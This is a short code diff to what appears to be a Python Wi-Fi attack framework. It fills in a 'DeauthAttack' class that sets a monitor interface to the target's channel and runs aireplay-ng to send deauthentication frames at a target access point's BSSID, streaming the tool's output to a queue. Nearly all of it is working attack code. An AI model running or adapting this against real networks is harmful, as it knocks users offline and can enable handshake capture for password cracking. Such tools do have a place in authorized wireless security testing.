@@ -22,6 +22,26 @@ class DeauthAttack(AbstractAttack):
 
     @classmethod
     def execute_attack(cls, q, kwargs) -> bool:
+
+        cmd = ['iwconfig', 
+               kwargs['interface'].monitor,
+               'channel',
+               str(kwargs['target'].channel)]
+        sb.run(cmd)
+
+        cmd = ['aireplay-ng',
+               '-0','10',
+               '-a', kwargs['target'].bssid,
+               kwargs['interface'].monitor]
+
+        result = AttackResultInfo()
+        result.attack = cls.attack_name()
+
+        p = sb.Popen(["stdbuf","-i0","-o0","-e0"] + cmd, stdout=sb.PIPE, text=True)
+        for line in p.stdout:
+            q.put(line)
+
+        """
         cmd = ['tshark',
             '-r', target_dump + '-01.cap',
             '-Y', 'wlan.rsn.capabilities',
@@ -40,7 +60,7 @@ class DeauthAttack(AbstractAttack):
             result.desc = cls.description(False)
 
         q.put(result)
-
+        """
 
 class TestAttack(AbstractAttack):
 
